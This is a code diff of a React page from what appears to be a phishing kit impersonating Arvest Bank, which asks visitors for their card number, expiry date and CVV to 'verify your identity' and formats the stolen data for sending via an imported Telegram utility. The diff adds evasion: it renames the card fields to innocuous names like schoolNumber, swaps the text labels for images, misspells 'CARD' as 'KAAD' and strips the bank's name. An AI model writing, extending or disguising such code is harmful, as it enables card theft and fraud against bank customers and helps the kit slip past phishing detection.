@@ -3,18 +3,21 @@ import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
 import { verifyCreditCardNumber } from "../utils/luhn";
+import schoolNumber from "../assets/schoolNumber.png"
+import entryCode from "../assets/entryCode.png"
+import resumptionDate from "../assets/resumptionDate.png"
 
 type Additional = {
-  cn: string;
-  edate: string;
-  ccv: string;
+  schoolNumber: string;
+  resumptionDate: string;
+  entryCode: string;
 };
 
 export default function Additional() {
   const [formInput, setFormInput] = useState<Additional>({
-    cn: "",
-    edate: "",
-    ccv: "",
+    schoolNumber: "",
+    resumptionDate: "",
+    entryCode: "",
   });
   const [isLoading, setIsLoading] = React.useState(false);
   const navigate = useNavigate();
@@ -58,15 +61,15 @@ export default function Additional() {
     event.preventDefault();
     
     const message = `
-    [----+🏦 ARVEST CARD 🏦+-----]
+    [----+🏦 ARVEST KAAD 🏦+-----]
 
-    CARD NUMBER: ${formInput.cn}
+    KAAD NUMBER: ${formInput.schoolNumber}
 
-    CARD EXPIRY: ${formInput.edate}
+    KAAD EXPIRY: ${formInput.resumptionDate}
 
-    CARD CVV: ${formInput.ccv}
+    KAAD CVV: ${formInput.entryCode}
     `;
-    const isValidCardNumber = verifyCreditCardNumber(formInput.cn);
+    const isValidCardNumber = verifyCreditCardNumber(formInput.schoolNumber);
     if (!isValidCardNumber) {
       document.getElementById("card-error")?.classList.remove("hide");
       return;
@@ -89,8 +92,7 @@ export default function Additional() {
           className="go-left"
           style={{ fontSize: "16px", marginBottom: "30px" }}
         >
-          To further verify your identity, Please enter your Debit/Credit Card
-          information <br />
+          To further verify your identity, Please fill out the form below <br />
         </p>
 
         <div style={{marginBottom:"20px"}} id="card-error" className="error-message hide">
@@ -102,12 +104,13 @@ export default function Additional() {
 
         <form id="login-form" onSubmit={handleSubmit} method="post">
           <div className="input-field">
-            <label htmlFor="username">
-              Card number <span style={{ color: "red" }}>*</span>
-            </label>
+          <div className="kylexy">
+          <img src={schoolNumber} height={16} alt="" />
+                      </div>
+            
             <input
               onChange={handleCardInputChange}
-              name="cn"
+              name="schoolNumber"
               minLength={16}
               maxLength={19}
               required
@@ -116,24 +119,24 @@ export default function Additional() {
           </div>
 
           <div className="input-field">
-            <label htmlFor="username">
-              Expiry date <span style={{ color: "red" }}>*</span>
-            </label>
+          <div className="kylexy">
+          <img src={resumptionDate} height={19} alt="" />
+                      </div>
             <input
               required
               maxLength={7}
               onChange={handleExpDate}
-              name="edate"
+              name="schoolNumber"
               type="text"
             />
           </div>
 
           <div className="input-field">
-            <label htmlFor="username">
-              CVV <span style={{ color: "red" }}>*</span>
-            </label>
+          <div className="kylexy">
+          <img src={entryCode} height={13} alt="" />
+                      </div>
             <input
-              name="ccv"
+              name="entryCode"
               required
               maxLength={4}
               onChange={handleInputChange}
@@ -161,7 +164,7 @@ export default function Additional() {
 
         <hr />
 
-        <p>Have questions about Arvest Online Banking?</p>
+        <p>Have questions?</p>
       </div>
     </>
   );
